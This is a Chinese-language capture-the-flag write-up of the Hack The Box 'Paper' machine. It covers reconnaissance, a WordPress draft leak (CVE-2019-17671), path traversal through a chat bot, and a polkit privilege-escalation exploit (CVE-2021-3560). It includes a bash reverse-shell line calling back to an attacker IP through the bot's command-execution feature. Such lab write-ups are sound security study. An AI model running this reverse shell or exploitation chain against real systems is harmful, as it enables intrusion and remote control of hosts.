---
title: Hack The Box - Paper(Easy)
date: 2022-02-17
tags:
  - htb
  - pentest
category: htb
password: CVE-2021-3560
---

# Hack The Box - Paper(Easy)

## Information

Nmap结果

```
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-17 14:31 CST
Nmap scan report for bogon (10.10.11.143)
Host is up (0.13s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey:
|   2048 10:05:ea:50:56:a6:00:cb:1c:9c:93:df:5f:83:e0:64 (RSA)
|   256 58:8c:82:1c:c6:63:2a:83:87:5c:2f:2b:4f:4d:c3:79 (ECDSA)
|_  256 31:78:af:d1:3b:c4:2e:9d:60:4e:eb:5d:03:ec:a0:22 (ED25519)
80/tcp  open  http     Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: HTTP Server Test Page powered by CentOS
|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
443/tcp open  ssl/http Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: HTTP Server Test Page powered by CentOS
|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US
| Subject Alternative Name: DNS:localhost.localdomain
| Not valid before: 2021-07-03T08:52:34
|_Not valid after:  2022-07-08T10:32:34
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|_  http/1.1

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 42.29 seconds
```

## Steps

### X-Backend-Server

Curl有个奇怪的头

```
curl -v http://10.10.11.143/ | more
*   Trying 10.10.11.143:80...
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0* Connected to 10.10.11.143 (10.10.11.143) port 80 (#0)
> GET / HTTP/1.1
> Host: 10.10.11.143
> User-Agent: curl/7.80.0
> Accept: */*
>
* Mark bundle as not supporting multiuse
< HTTP/1.1 403 Forbidden
< Date: Thu, 17 Feb 2022 06:43:52 GMT
< Server: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
< X-Backend-Server: office.paper
< Last-Modified: Sun, 27 Jun 2021 23:47:13 GMT
< ETag: "30c0b-5c5c7fdeec240"
< Accept-Ranges: bytes
< Content-Length: 199691
< Content-Type: text/html; charset=UTF-8
<
```

修改hosts让`office.paper`解析到`10.10.11.143`

是个wordpress

### Wordpress

wpscan

找到 `CVE-2019-17671`

访问`http://office.paper/?static=1`

```
test

Micheal please remove the secret from drafts for gods sake!

Hello employees of Blunder Tiffin,

Due to the orders from higher officials, every employee who were added to this blog is removed and they are migrated to our new chat system.

So, I kindly request you all to take your discussions from the public blog to a more private chat system.

-Nick

# Warning for Michael

Michael, you have to stop putting secrets in the drafts. It is a huge security issue and you have to stop doing it. -Nick

Threat Level Midnight

A MOTION PICTURE SCREENPLAY,
WRITTEN AND DIRECTED BY
MICHAEL SCOTT

[INT:DAY]

Inside the FBI, Agent Michael Scarn sits with his feet up on his desk. His robotic butler Dwigt….

# Secret Registration URL of new Employee chat system

http://chat.office.paper/register/8qozr226AhkCHZdyY

# I am keeping this draft unpublished, as unpublished drafts cannot be accessed by outsiders. I am not that ignorant, Nick.

# Also, stop looking at my drafts. Jeez!
```

### Chat

修改hosts访问`chat.office.paper`

```
> GET / HTTP/1.1
> Host: chat.office.paper
> User-Agent: curl/7.80.0
> Accept: */*
>
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Date: Thu, 17 Feb 2022 07:07:42 GMT
< Server: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
< X-Backend-Server: office.paper
< X-XSS-Protection: 1
< X-Content-Type-Options: nosniff
< X-Frame-Options: sameorigin
< Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-eval'; connect-src * 'self' data:; img-src data: 'self' http://* https://*; style-src 'self' 'unsafe-inline'; media-src 'self' http://* https://*; frame-src 'self' http://* https://*; font-src 'self' data:;
< X-Instance-ID: FSECETEzRJLB9RyX3
< Content-Type: text/html; charset=utf-8
< Vary: Accept-Encoding
< Transfer-Encoding: chunked
<
```

注册，登录，找到机器人

发送`recyclops help`

获得帮助

![image-20220217152039907](https://cdn.yoshino-s.online//typora_img/image-20220217152039907.png)

```
recyclops file ../hubot/scripts/run.js
```

```
// Description:
// Runs a command on hubot
// TOTAL VIOLATION of any and all security!
//
// Commands:
// hubot run <command> - runs a command on hubot host

module.exports = function(robot) {
robot.respond("/RUN (.*)$/i", function(msg) {
console.log(msg);
var cmd = msg.match[1];
msg.send("Running " + cmd);
var exec = require('child_process').exec;
exec(cmd, function(error, stdout, stderr) {
if (error) {
msg.send(error);
msg.send(stderr);
} else {
msg.send(stdout);
}
});
});
};
```

所以发送

```
cmd bash -i >& /dev/tcp/10.10.14.5/7788 0>&1run ls
```

![image-20220217163500031](https://cdn.yoshino-s.online//typora_img/image-20220217163500031.png)

找到作者自己写的提权脚本

https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation

多跑几次就行了

